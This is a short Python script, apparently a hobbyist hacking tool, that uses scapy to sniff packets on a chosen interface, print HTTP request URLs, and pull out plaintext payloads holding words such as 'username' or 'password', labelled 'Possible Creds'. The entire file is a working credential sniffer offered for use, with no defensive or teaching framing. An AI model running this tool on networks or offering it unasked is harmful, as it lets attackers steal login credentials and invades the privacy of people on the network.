#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http

def get_protocol():
    protocols = {
        '1': 'icmp',
        '2': 'igmp',
        '6': 'tcp',
        '17': 'udp'
    }
    print("Available protocols:")
    for num, protocol in protocols.items():
        print(f"{num}: {protocol}")
    protocol_choice = input("Enter protocol number to filter (e.g., 1, 2, 6, 17): ")
    return protocols.get(protocol_choice, None)

def get_ports():
    ports = input("Enter comma-separated ports to filter (e.g., 21,80,443): ")
    return ports

def sniff(interface, protocol=None, ports=None):
    if protocol:
        filter_protocol = f"{protocol}"
    else:
        filter_protocol = ""

    if ports:
        filter_ports = f" and (port {' or port '.join(ports.split(','))})"
    else:
        filter_ports = ""

    filter_str = filter_protocol + filter_ports

    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter=filter_str)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode()
        keywords = ["username", "user", "login", "email", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Req >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Creds >> " + login_info + "\n\n")

def main():
    interface = input("Enter interface to sniff (e.g., eth0): ")
    filter_protocol = get_protocol()
    filter_ports = get_ports()
    sniff(interface, filter_protocol, filter_ports)

if __name__ == "__main__":
    main()
